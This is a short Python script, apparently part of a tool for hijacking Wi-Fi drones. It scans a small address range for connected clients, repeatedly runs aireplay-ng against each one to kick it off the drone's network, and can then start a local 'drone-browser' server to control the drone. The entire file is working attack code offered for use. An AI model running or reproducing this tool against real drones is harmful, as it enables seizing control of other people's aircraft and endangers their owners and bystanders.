
import os, time, sys
from ftplib import FTP
from scan_clients import *
from spoof import *
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'


def eject_client(client, mac_drone, drone_essid, iface):
    mac_client = client.mac
    # print(client.mac)
    channel = 6
    cmd = "sudo aireplay-ng -1 0 -e {3} -a {0} -c {1} {2}".format(mac_drone, mac_client, iface, drone_essid)
    os.system("sudo iwconfig {0} channel {1}".format(iface, channel))
    for i in range(40):
        os.system(cmd)

def launch_server():
    cmd = "cd drone-browser && node server.js &"
    cmd2 = "firefox localhost:3001"
    os.system(cmd)
    # os.system(cmd2)




def take_control_main(drone, iface):
    network = '192.168.1.2-10'
    mac_drone = drone.bssid
    drone_essid = drone.essid
    client_list = scanNetwork(network)
    for client in client_list:
        # print(client.ip)
        try :
            eject_client(client, mac_drone, drone_essid, iface)
        except:
            print("{}No client connected{}".format(RED, WHITE))
    # launch_server()
